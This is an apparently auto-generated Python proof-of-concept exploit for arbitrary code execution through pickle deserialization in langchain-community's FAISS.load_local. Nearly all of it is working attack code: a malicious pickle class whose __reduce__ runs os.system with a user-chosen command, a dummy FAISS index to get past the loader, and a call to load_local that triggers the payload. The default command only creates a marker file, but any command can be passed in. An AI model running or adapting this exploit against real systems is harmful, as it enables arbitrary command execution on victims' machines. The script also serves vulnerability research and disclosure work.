#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_load_local_function_uses_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for CVE-like RCE in langchain-community's FAISS.load_local.
Demonstrates how an attacker who can control folder_path, index_name, and
allow_dangerous_deserialization can achieve arbitrary code execution via pickle
deserialization.

Usage:
    python poc.py               # runs locally with default benign payload
    python poc.py --command "id" # custom command
"""

import argparse
import logging
import os
import pickle
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# ------------------------------------------------------------------------------
# 1. Configurable parameters
# ------------------------------------------------------------------------------
parser = argparse.ArgumentParser(description="PoC: RCE via FAISS.load_local")
parser.add_argument(
    "--command",
    default="touch /tmp/poc_success.txt",
    help="Command to execute (benign default: touch /tmp/poc_success.txt)",
)
parser.add_argument(
    "--target",
    default=None,
    help="(Unused in local PoC) – placeholder for remote target URL",
)
args = parser.parse_args()

BENIGN_COMMAND = args.command

# ------------------------------------------------------------------------------
# 2. Imports (target library + dependencies)
# ------------------------------------------------------------------------------
try:
    import faiss  # FAISS must be installed (part of langchain-community deps)
except ImportError:
    print("[!] FAISS not found. Install with: pip install faiss-cpu")
    sys.exit(1)

# We need an embeddings object. Create a minimal one to satisfy load_local.
try:
    from langchain_community.vectorstores import FAISS
except ImportError:
    print("[!] langchain-community not found. Ensure it's installed.")
    sys.exit(1)


class SimpleEmbeddings:
    """Minimal embeddings class that returns fixed vectors."""

    def embed_query(self, text: str) -> list[float]:
        return [0.0]  # dimension must match FAISS index

    def embed_documents(self, texts: list[str]) -> list[list[float]]:
        return [[0.0] for _ in texts]


# ------------------------------------------------------------------------------
# 3. Malicious pickle class
# ------------------------------------------------------------------------------
class MaliciousDocstore:
    """
    This class, when unpickled, executes a configurable command via __reduce__.
    __reduce__ is called during unpickling to reconstruct the object.
    """
    def __reduce__(self):
        # Return (callable, args) – here we call os.system with our command.
        # For safety, we use a benign default.
        return (os.system, (BENIGN_COMMAND,))


def create_malicious_pickle(pkl_path: Path) -> None:
    """
    Create a pickle file that, when loaded, executes BENIGN_COMMAND.
    The expected format for load_local is a tuple (docstore, index_to_docstore_id).
    We substitute the docstore with our malicious object.
    """
    # The malicious object will be the docstore. index_to_docstore_id can be empty.
    malicious_data = (MaliciousDocstore(), {})
    with open(pkl_path, "wb") as f:
        pickle.dump(malicious_data, f)
    print(f"[+] Malicious pickle written to {pkl_path}")


def create_dummy_faiss_index(index_path: Path, dim: int = 1) -> None:
    """
    Create a minimal FAISS index so that load_local does not fail before
    it reaches the pickle.load() sink.
    """
    index = faiss.IndexFlatL2(dim)          # L2 distance, dimension 1
    # Add one dummy vector so the index is non-empty.
    index.add(faiss.vector_to_array([0.0]).reshape(1, -1))
    faiss.write_index(index, str(index_path))
    print(f"[+] Dummy FAISS index written to {index_path}")


# ------------------------------------------------------------------------------
# 4. Main exploitation routine
# ------------------------------------------------------------------------------
def main():
    # Clean any previous marker file.
    marker = Path("/tmp/poc_success.txt")
    if marker.exists():
        marker.unlink()
        print("[*] Removed previous marker file.")

    # Use a temporary directory to contain the malicious files.
    with tempfile.TemporaryDirectory() as tmpdir:
        folder = Path(tmpdir)
        index_name = "exploit"

        # Create the malicious pickle and dummy FAISS index.
        pkl_path = folder / f"{index_name}.pkl"
        faiss_path = folder / f"{index_name}.faiss"

        create_malicious_pickle(pkl_path)
        create_dummy_faiss_index(faiss_path)

        # Instantiate a dummy embeddings object.
        embeddings = SimpleEmbeddings()

        print(f"[*] Calling FAISS.load_local with folder_path={folder}, index_name={index_name}, allow_dangerous_deserialization=True")
        try:
            # This call will:
            #   1. Load the FAISS index (dummy, succeeds)
            #   2. Load the pickle file -> execute os.system(BENIGN_COMMAND)
            FAISS.load_local(
                folder_path=str(folder),
                embeddings=embeddings,
                index_name=index_name,
                allow_dangerous_deserialization=True,
            )
        except Exception as e:
            # The command might have already executed even if an error occurs later.
            print(f"[!] Exception after pickle load (expected): {e}")

    # Check if the command was executed.
    if marker.exists():
        print(f"[+] SUCCESS: Marker file {marker} created. Command executed.")
    else:
        print(f"[-] Marker file not found. Command may not have executed.")
        print("    Check the command or ensure the pickle was loaded.")


if __name__ == "__main__":
    main()
